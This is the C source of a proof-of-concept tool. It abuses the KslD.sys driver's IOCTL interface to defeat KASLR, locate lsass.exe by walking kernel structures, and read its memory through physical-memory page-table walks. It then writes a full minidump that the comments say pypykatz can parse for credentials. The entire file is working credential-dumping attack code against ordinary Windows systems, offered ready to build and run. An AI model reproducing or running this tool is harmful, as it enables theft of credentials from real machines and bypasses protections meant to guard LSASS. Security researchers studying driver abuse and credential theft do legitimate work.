/*
 * PoC: KslD.sys SubCmd 7 - lsass minidump via physical memory (C)
 *
 * All intermediate data is held in heap memory.
 * Only one file is written: the final .dmp (minidump format).
 * pypykatz can parse it: pypykatz lsa minidump lsass.dmp
 *
 * Build: cl /O2 poc_subcmd7_minidump.c /Fe:poc_subcmd7_minidump.exe
 *        /link shell32.lib advapi32.lib
 */
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

#define KSLD_IOCTL  0x222044
#define PFN_MASK    0xFFFFFFFFF000ULL
#define MAX_MODULES 200
#define MAX_RANGES  8192

static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* ── Helpers ──────────────────────────────────────────────────── */
static uint16_t rw_(const uint8_t *d, size_t o) { uint16_t v; memcpy(&v,d+o,2); return v; }
static uint32_t rd_(const uint8_t *d, size_t o) { uint32_t v; memcpy(&v,d+o,4); return v; }
static uint64_t rp_(const uint8_t *d, size_t o) { uint64_t v; memcpy(&v,d+o,8); return v; }

/* ── IOCTL ────────────────────────────────────────────────────── */
static BOOL ioctl_raw(const void *in, DWORD in_sz, void *out, DWORD out_sz, DWORD *ret) {
    DWORD r=0;
    BOOL ok = DeviceIoControl(g_dev, KSLD_IOCTL, (void*)in, in_sz, out, out_sz, &r, NULL);
    if (ret) *ret=r;
    return ok && r>0;
}

static uint64_t resolve_symbol(const wchar_t *name) {
    size_t nb = (wcslen(name)+1)*sizeof(wchar_t);
    size_t total = 12+nb;
    uint8_t *buf = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total);
    *(uint32_t*)(buf+0)=7; *(uint32_t*)(buf+4)=(uint32_t)nb; *(uint32_t*)(buf+8)=0xc;
    memcpy(buf+12, name, nb);
    uint64_t res=0; DWORD ret=0;
    BOOL ok = ioctl_raw(buf,(DWORD)total,&res,sizeof(res),&ret) && ret>=8;
    HeapFree(GetProcessHeap(),0,buf);
    return ok ? res : 0;
}

#pragma pack(push,1)
typedef struct { uint32_t cmd,res; uint64_t addr,size; uint32_t mode,pad; } IoRead;
#pragma pack(pop)

static BOOL virt_read(uint64_t addr, void *out, uint64_t sz) {
    IoRead req={12,0,addr,sz,2,0};
    DWORD osz=(DWORD)(sz+256>4096?sz+256:4096);
    uint8_t *tmp=(uint8_t*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,osz);
    DWORD ret=0;
    BOOL ok=ioctl_raw(&req,sizeof(req),tmp,osz,&ret);
    if (ok&&ret>=sz) { memcpy(out,tmp,(size_t)sz); HeapFree(GetProcessHeap(),0,tmp); return TRUE; }
    HeapFree(GetProcessHeap(),0,tmp); return FALSE;
}
static BOOL phys_read(uint64_t addr, void *out, uint64_t sz) {
    IoRead req={12,0,addr,sz,1,0};
    DWORD osz=(DWORD)(sz+256>4096?sz+256:4096);
    uint8_t *tmp=(uint8_t*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,osz);
    DWORD ret=0;
    BOOL ok=ioctl_raw(&req,sizeof(req),tmp,osz,&ret);
    if (ok&&ret>=sz) { memcpy(out,tmp,(size_t)sz); HeapFree(GetProcessHeap(),0,tmp); return TRUE; }
    HeapFree(GetProcessHeap(),0,tmp); return FALSE;
}

/* ── Page table walk ──────────────────────────────────────────── */
static uint64_t vtp(uint64_t dtb, uint64_t va) {
    uint64_t db=dtb&PFN_MASK, e;
    int sh[]={39,30,21};
    for (int i=0;i<3;i++) {
        if (!phys_read(db+((va>>sh[i])&0x1FF)*8,&e,8)) return 0;
        if (!(e&1)) return 0;
        if ((e&0x80)&&sh[i]<39) { uint64_t m=((uint64_t)1<<sh[i])-1; return (e&PFN_MASK&~m)|(va&m); }
        db=e&PFN_MASK;
    }
    if (!phys_read(db+((va>>12)&0x1FF)*8,&e,8)) return 0;
    if (e&1) return (e&PFN_MASK)|(va&0xFFF);
    if (e&0x800) return (e&PFN_MASK)|(va&0xFFF);
    return 0;
}

static void proc_read(uint64_t dtb, uint64_t va, void *out, size_t sz) {
    uint8_t *dst=(uint8_t*)out; size_t off=0;
    while (off<sz) {
        size_t pg=(va+off)&0xFFF, chunk=sz-off;
        if (chunk>0x1000-pg) chunk=0x1000-pg;
        uint64_t pa=vtp(dtb,va+off);
        if (pa) { if (!phys_read(pa,dst+off,chunk)) memset(dst+off,0,chunk); }
        else memset(dst+off,0,chunk);
        off+=chunk;
    }
}
static uint64_t read_ptr(uint64_t dtb, uint64_t va) {
    uint64_t v=0; proc_read(dtb,va,&v,8); return v;
}

/* ── Dynamic buffer (all in heap, no temp files) ──────────────── */
typedef struct { uint8_t *data; size_t len, cap; } Buf;
static void buf_init(Buf *b, size_t init_cap) {
    b->data = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, init_cap);
    b->len = 0; b->cap = init_cap;
}
static void buf_write(Buf *b, const void *src, size_t n) {
    while (b->len + n > b->cap) {
        size_t nc = b->cap * 2;
        uint8_t *nd = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nc);
        memcpy(nd, b->data, b->len);
        HeapFree(GetProcessHeap(), 0, b->data);
        b->data = nd; b->cap = nc;
    }
    memcpy(b->data + b->len, src, n);
    b->len += n;
}
static void buf_write_u16(Buf *b, uint16_t v) { buf_write(b, &v, 2); }
static void buf_write_u32(Buf *b, uint32_t v) { buf_write(b, &v, 4); }
static void buf_write_u64(Buf *b, uint64_t v) { buf_write(b, &v, 8); }
static void buf_write_zeros(Buf *b, size_t n) {
    while (b->len + n > b->cap) {
        size_t nc = b->cap * 2;
        uint8_t *nd = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nc);
        memcpy(nd, b->data, b->len);
        HeapFree(GetProcessHeap(), 0, b->data);
        b->data = nd; b->cap = nc;
    }
    memset(b->data + b->len, 0, n);
    b->len += n;
}
static void buf_patch_u32(Buf *b, size_t off, uint32_t v) { memcpy(b->data+off, &v, 4); }
static void buf_patch_u64(Buf *b, size_t off, uint64_t v) { memcpy(b->data+off, &v, 8); }
static void buf_free(Buf *b) { if(b->data) HeapFree(GetProcessHeap(),0,b->data); b->data=NULL; }

/* ── Module info (in memory) ──────────────────────────────────── */
typedef struct {
    uint64_t base; uint32_t size, timestamp, checksum;
    wchar_t name[260];
} ModInfo;

/* ── Memory range ─────────────────────────────────────────────── */
typedef struct { uint64_t start, size; } MemRange;

/* ═══════════════════════════════════════════════════════════════ */
int main(void) {
    if (!IsUserAnAdmin()) { printf("[-] Requires administrator\n"); return 1; }

    HKEY hk; uint32_t build = 0;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                      0, KEY_READ, &hk) == ERROR_SUCCESS) {
        wchar_t bs[32]; DWORD bsz = sizeof(bs);
        RegQueryValueExW(hk, L"CurrentBuildNumber", NULL, NULL, (LPBYTE)bs, &bsz);
        RegCloseKey(hk); build = (uint32_t)wcstoul(bs, NULL, 10);
    }

    char out_path[MAX_PATH];
    sprintf(out_path, "%s\\lsass_c.dmp", getenv("USERPROFILE") ? getenv("USERPROFILE") : ".");

    printf("================================================================\n");
    printf("  SubCmd 7 - lsass Minidump Generator (C)\n");
    printf("  Build %u, Output: %s\n", build, out_path);
    printf("================================================================\n\n");

    g_dev = CreateFileW(L"\\\\.\\KslD", GENERIC_READ|GENERIC_WRITE,
        FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev==INVALID_HANDLE_VALUE) { printf("[-] CreateFile failed: %lu\n",GetLastError()); return 1; }
    printf("[+] Device opened\n");

    /* Step 1: SubCmd 7 */
    printf("\n[*] Step 1: KASLR bypass via SubCmd 7\n");
    uint64_t psip = resolve_symbol(L"PsInitialSystemProcess");
    if (!psip) { printf("[-] SubCmd 7 failed\n"); return 1; }
    printf("    PsInitialSystemProcess = 0x%016llx\n", (unsigned long long)psip);

    /* Step 2: Find lsass */
    printf("\n[*] Step 2: Finding lsass.exe\n");
    uint64_t sys_ep=0; virt_read(psip,&sys_ep,8);
    uint8_t ep_data[0x800]; virt_read(sys_ep,ep_data,sizeof(ep_data));
    uint32_t off_pid=0, off_links=0, off_name=0;
    for(uint32_t o=0x100;o<0x600;o+=8)
        if(rp_(ep_data,o)==4&&rp_(ep_data,o+8)>0xFFFF000000000000ULL){off_pid=o;off_links=o+8;break;}
    for(uint32_t o=0x200;o<0x700;o++)
        if(memcmp(ep_data+o,"System\0",7)==0){off_name=o;break;}
    if(!off_pid||!off_name){printf("[-] EPROCESS offsets\n");return 1;}

    uint64_t head=sys_ep+off_links, cur=0; virt_read(head,&cur,8);
    uint64_t lsass_ep=0, lsass_dtb=0; uint32_t lsass_pid=0, lsass_peb_off=0;
    uint64_t seen[1024]; int nseen=1; seen[0]=head;
    for(int iter=0;iter<500&&cur;iter++){
        int dup=0; for(int s=0;s<nseen;s++) if(seen[s]==cur){dup=1;break;}
        if(dup)break; if(nseen<1024)seen[nseen++]=cur;
        uint64_t ep=cur-off_links;
        char nm[16]={0}; virt_read(ep+off_name,nm,15);
        if(_stricmp(nm,"lsass.exe")==0){
            uint64_t pid=0; virt_read(ep+off_pid,&pid,8); virt_read(ep+0x28,&lsass_dtb,8);
            lsass_ep=ep; lsass_pid=(uint32_t)pid;
            uint8_t ep2[0x600]; virt_read(ep,ep2,sizeof(ep2));
            for(uint32_t po=0x100;po<0x600;po+=8){
                uint64_t v=rp_(ep2,po);
                if(v>0x10000&&v<0x7FFFFFFFFFFFULL){
                    uint8_t peb[0x20]={0}; proc_read(lsass_dtb,v,peb,0x20);
                    uint64_t ldr=rp_(peb,0x18), img=rp_(peb,0x10);
                    if(ldr>0x10000&&ldr<0x7FFFFFFFFFFFULL&&img>0x10000&&img<0x7FFFFFFFFFFFULL){lsass_peb_off=po;break;}
                }
            }
            break;
        }
        virt_read(cur,&cur,8);
    }
    if(!lsass_ep){printf("[-] lsass not found\n");return 1;}
    printf("    PID=%u EPROCESS=0x%llx DTB=0x%llx\n",lsass_pid,(unsigned long long)lsass_ep,(unsigned long long)lsass_dtb);

    /* Step 3: Enumerate modules (in memory) */
    printf("\n[*] Step 3: Enumerating modules\n");
    uint64_t peb_va=read_ptr(lsass_dtb,lsass_ep+lsass_peb_off);
    uint8_t peb[0x20]; proc_read(lsass_dtb,peb_va,peb,0x20);
    uint64_t ldr_va=rp_(peb,0x18), ldr_head=ldr_va+0x20;
    uint64_t ldr_cur=read_ptr(lsass_dtb,ldr_head);

    ModInfo *mods = (ModInfo*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(ModInfo)*MAX_MODULES);
    int nmod=0;
    uint64_t ldr_seen[256]; int ldr_nseen=1; ldr_seen[0]=ldr_head;

    while(ldr_cur && ldr_nseen<256 && nmod<MAX_MODULES){
        int dup=0; for(int s=0;s<ldr_nseen;s++) if(ldr_seen[s]==ldr_cur){dup=1;break;}
        if(dup)break; ldr_seen[ldr_nseen++]=ldr_cur;
        uint8_t entry[0x80]={0}; proc_read(lsass_dtb,ldr_cur-0x10,entry,0x80);
        uint64_t dbase=rp_(entry,0x30); uint32_t dsz=rd_(entry,0x40);
        uint16_t nlen=rw_(entry,0x48); uint64_t nptr=rp_(entry,0x50);
        if(dbase&&dsz){
            ModInfo *m=&mods[nmod];
            m->base=dbase; m->size=dsz;
            if(nlen&&nptr&&nlen<520) proc_read(lsass_dtb,nptr,m->name,nlen<518?nlen:518);
            uint8_t pe_hdr[0x200]={0}; proc_read(lsass_dtb,dbase,pe_hdr,0x200);
            if(pe_hdr[0]=='M'&&pe_hdr[1]=='Z'){
                uint32_t pe_off=rd_(pe_hdr,0x3c);
                if(pe_off+0x58<0x200&&pe_hdr[pe_off]=='P'&&pe_hdr[pe_off+1]=='E'){
                    m->timestamp=rd_(pe_hdr,pe_off+8); m->checksum=rd_(pe_hdr,pe_off+0x58);
                }
            }
            wchar_t *sl=wcsrchr(m->name,L'\\');
            char short_name[260]={0};
            WideCharToMultiByte(CP_ACP,0,sl?sl+1:m->name,-1,short_name,260,NULL,NULL);
            printf("    0x%016llx 0x%08x %s\n",(unsigned long long)dbase,dsz,short_name);
            nmod++;
        }
        ldr_cur=rp_(entry,0x10);
    }
    printf("    %d modules\n",nmod);

    /* Step 4: Scan page tables */
    printf("\n[*] Step 4: Scanning page tables\n");
    uint64_t *pages = (uint64_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(uint64_t)*200000);
    int npages=0;
    uint64_t dtb_base = lsass_dtb & PFN_MASK;

    LARGE_INTEGER t0,t1,freq; QueryPerformanceFrequency(&freq); QueryPerformanceCounter(&t0);

    for(int pml4=0; pml4<256; pml4++){
        uint64_t pml4e; if(!phys_read(dtb_base+pml4*8,&pml4e,8)||!(pml4e&1)) continue;
        uint64_t pdpt_base=pml4e&PFN_MASK;
        for(int pdpt=0; pdpt<512; pdpt++){
            uint64_t pdpte; if(!phys_read(pdpt_base+pdpt*8,&pdpte,8)||!(pdpte&1)) continue;
            if(pdpte&0x80) continue; /* skip 1GB pages for user space - rare */
            uint64_t pd_base=pdpte&PFN_MASK;
            for(int pd=0; pd<512; pd++){
                uint64_t pde; if(!phys_read(pd_base+pd*8,&pde,8)||!(pde&1)) continue;
                if(pde&0x80){ /* 2MB large page */
                    uint64_t va_base=((uint64_t)pml4<<39)|((uint64_t)pdpt<<30)|((uint64_t)pd<<21);
                    for(int p=0;p<512&&npages<200000;p++)
                        pages[npages++]=va_base+(uint64_t)p*0x1000;
                    continue;
                }
                uint64_t pt_base=pde&PFN_MASK;
                uint8_t pt_buf[4096];
                if(!phys_read(pt_base,pt_buf,4096)) continue;
                for(int pt=0;pt<512&&npages<200000;pt++){
                    uint64_t pte=rp_(pt_buf,pt*8);
                    if(pte&1||pte&0x800){
                        uint64_t va=((uint64_t)pml4<<39)|((uint64_t)pdpt<<30)|((uint64_t)pd<<21)|((uint64_t)pt<<12);
                        pages[npages++]=va;
                    }
                }
            }
        }
    }

    QueryPerformanceCounter(&t1);
    printf("    %d pages (%.1f MB) in %.1fs\n", npages, npages*4096.0/1048576.0,
           (double)(t1.QuadPart-t0.QuadPart)/(double)freq.QuadPart);

    /* Sort pages */
    for(int i=0;i<npages-1;i++) for(int j=i+1;j<npages;j++) if(pages[j]<pages[i]){uint64_t t=pages[i];pages[i]=pages[j];pages[j]=t;}

    /* Merge into contiguous ranges */
    MemRange *ranges = (MemRange*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MemRange)*MAX_RANGES);
    int nranges=0;
    if(npages>0){
        uint64_t rs=pages[0], re=pages[0]+0x1000;
        for(int i=1;i<npages;i++){
            if(pages[i]==re) re=pages[i]+0x1000;
            else { if(nranges<MAX_RANGES){ranges[nranges].start=rs;ranges[nranges].size=re-rs;nranges++;} rs=pages[i];re=pages[i]+0x1000; }
        }
        if(nranges<MAX_RANGES){ranges[nranges].start=rs;ranges[nranges].size=re-rs;nranges++;}
    }
    printf("    %d contiguous ranges\n",nranges);

    /* Step 5: Read all pages into memory */
    printf("\n[*] Step 5: Reading %d pages\n",npages);
    size_t total_mem = (size_t)npages * 0x1000;
    uint8_t *mem_data = (uint8_t*)VirtualAlloc(NULL, total_mem, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if(!mem_data){printf("[-] VirtualAlloc %zu bytes failed\n",total_mem);return 1;}

    QueryPerformanceCounter(&t0);
    size_t mem_off=0;
    for(int r=0;r<nranges;r++){
        proc_read(lsass_dtb, ranges[r].start, mem_data+mem_off, (size_t)ranges[r].size);
        mem_off += (size_t)ranges[r].size;
    }
    QueryPerformanceCounter(&t1);
    printf("    %.1f MB in %.1fs\n", mem_off/1048576.0,
           (double)(t1.QuadPart-t0.QuadPart)/(double)freq.QuadPart);

    /* Step 6: Build minidump in memory buffer */
    printf("\n[*] Step 6: Building minidump in memory\n");
    Buf dmp; buf_init(&dmp, total_mem + 1048576); /* extra space for headers */

    /* Header (32 bytes) */
    buf_write_u32(&dmp, 0x504D444D);  /* MDMP */
    buf_write_u32(&dmp, 0x0000A793);  /* Version */
    buf_write_u32(&dmp, 3);           /* 3 streams */
    size_t dir_rva_pos = dmp.len;
    buf_write_u32(&dmp, 0);           /* StreamDirectoryRva (patch) */
    buf_write_u32(&dmp, 0);           /* CheckSum */
    buf_write_u32(&dmp, (uint32_t)time(NULL)); /* Timestamp */
    buf_write_u64(&dmp, 2);           /* Flags = MiniDumpWithFullMemory */

    /* Stream directory */
    size_t dir_rva = dmp.len;
    buf_patch_u32(&dmp, dir_rva_pos, (uint32_t)dir_rva);
    size_t dir_pos = dmp.len;
    buf_write_zeros(&dmp, 3*12); /* 3 entries placeholder */

    /* SystemInfoStream */
    size_t si_rva = dmp.len;
    buf_write_u16(&dmp, 9);   /* AMD64 */
    buf_write_u16(&dmp, 6);   /* ProcessorLevel */
    buf_write_u16(&dmp, 0);   /* ProcessorRevision */
    { SYSTEM_INFO si; GetSystemInfo(&si); buf_write(&dmp, &(uint8_t){(uint8_t)si.dwNumberOfProcessors}, 1); }
    buf_write(&dmp, &(uint8_t){1}, 1); /* VER_NT_WORKSTATION */
    buf_write_u32(&dmp, 10);  /* MajorVersion */
    buf_write_u32(&dmp, 0);   /* MinorVersion */
    buf_write_u32(&dmp, build);
    buf_write_u32(&dmp, 2);   /* VER_PLATFORM_WIN32_NT */
    buf_write_u32(&dmp, 0);   /* CSDVersionRva */
    buf_write_u16(&dmp, 0);   /* SuiteMask */
    buf_write_u16(&dmp, 0);   /* Reserved */
    buf_write_zeros(&dmp, 24); /* CPU_INFORMATION */
    size_t si_size = dmp.len - si_rva;

    /* Module name strings */
    uint32_t *name_rvas = (uint32_t*)HeapAlloc(GetProcessHeap(), 0, sizeof(uint32_t)*nmod);
    for(int i=0;i<nmod;i++){
        name_rvas[i] = (uint32_t)dmp.len;
        int wlen = (int)wcslen(mods[i].name);
        uint32_t byte_len = (uint32_t)(wlen * sizeof(wchar_t));
        buf_write_u32(&dmp, byte_len);
        buf_write(&dmp, mods[i].name, byte_len);
        buf_write_u16(&dmp, 0); /* null term */
    }

    /* ModuleListStream */
    size_t ml_rva = dmp.len;
    buf_write_u32(&dmp, (uint32_t)nmod);
    for(int i=0;i<nmod;i++){
        buf_write_u64(&dmp, mods[i].base);
        buf_write_u32(&dmp, mods[i].size);
        buf_write_u32(&dmp, mods[i].checksum);
        buf_write_u32(&dmp, mods[i].timestamp);
        buf_write_u32(&dmp, name_rvas[i]);
        buf_write_zeros(&dmp, 52); /* VS_FIXEDFILEINFO */
        buf_write_u32(&dmp, 0); buf_write_u32(&dmp, 0); /* CvRecord */
        buf_write_u32(&dmp, 0); buf_write_u32(&dmp, 0); /* MiscRecord */
        buf_write_u64(&dmp, 0); buf_write_u64(&dmp, 0); /* Reserved */
    }
    size_t ml_size = dmp.len - ml_rva;
    HeapFree(GetProcessHeap(),0,name_rvas);

    /* Memory64ListStream */
    size_t m64_rva = dmp.len;
    buf_write_u64(&dmp, (uint64_t)nranges);
    size_t base_rva_pos = dmp.len;
    buf_write_u64(&dmp, 0); /* BaseRva (patch) */
    for(int r=0;r<nranges;r++){
        buf_write_u64(&dmp, ranges[r].start);
        buf_write_u64(&dmp, ranges[r].size);
    }
    size_t m64_size = dmp.len - m64_rva;

    /* Memory data */
    size_t data_rva = dmp.len;
    buf_patch_u64(&dmp, base_rva_pos, (uint64_t)data_rva);
    buf_write(&dmp, mem_data, mem_off);

    /* Patch stream directory */
    size_t p = dir_pos;
    /* Entry 0: SystemInfoStream (type 7) */
    buf_patch_u32(&dmp, p+0, 7); buf_patch_u32(&dmp, p+4, (uint32_t)si_size); buf_patch_u32(&dmp, p+8, (uint32_t)si_rva);
    p += 12;
    /* Entry 1: ModuleListStream (type 4) */
    buf_patch_u32(&dmp, p+0, 4); buf_patch_u32(&dmp, p+4, (uint32_t)ml_size); buf_patch_u32(&dmp, p+8, (uint32_t)ml_rva);
    p += 12;
    /* Entry 2: Memory64ListStream (type 9) */
    buf_patch_u32(&dmp, p+0, 9); buf_patch_u32(&dmp, p+4, (uint32_t)m64_size); buf_patch_u32(&dmp, p+8, (uint32_t)m64_rva);

    printf("    Minidump: %zu bytes (%.1f MB)\n", dmp.len, dmp.len/1048576.0);

    /* Step 7: Write single .dmp file */
    printf("\n[*] Step 7: Writing %s\n", out_path);
    HANDLE hf = CreateFileA(out_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hf==INVALID_HANDLE_VALUE){printf("[-] CreateFile failed\n");return 1;}
    DWORD written=0;
    /* Write in chunks (WriteFile limit) */
    size_t woff=0;
    while(woff<dmp.len){
        DWORD chunk = (DWORD)((dmp.len-woff > 0x40000000) ? 0x40000000 : dmp.len-woff);
        WriteFile(hf, dmp.data+woff, chunk, &written, NULL);
        woff += written;
    }
    CloseHandle(hf);

    printf("    Done: %zu bytes written\n", dmp.len);
    printf("\n================================================================\n");
    printf("  Verify: pypykatz lsa minidump %s\n", out_path);
    printf("================================================================\n");

    /* Cleanup */
    buf_free(&dmp);
    VirtualFree(mem_data, 0, MEM_RELEASE);
    HeapFree(GetProcessHeap(),0,pages);
    HeapFree(GetProcessHeap(),0,ranges);
    HeapFree(GetProcessHeap(),0,mods);
    CloseHandle(g_dev);
    return 0;
}
